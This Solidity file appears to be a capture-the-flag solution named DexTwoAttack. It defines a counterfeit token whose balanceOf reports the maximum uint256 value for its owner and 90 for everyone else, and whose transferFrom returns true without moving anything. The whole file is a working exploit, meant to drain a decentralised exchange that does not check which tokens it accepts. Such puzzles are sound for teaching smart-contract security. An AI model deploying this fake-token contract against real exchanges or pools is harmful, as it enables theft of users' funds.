// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract DexTwoAttack {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function balanceOf(address _addr) external view returns (uint256) {
        if (_addr == owner) {
            return 2 ** 256 - 1;
        } else {
            return 90;
        }
    }
    
    function transferFrom(address a, address b, uint256 c) external returns (bool) {
      return true;
    }
}
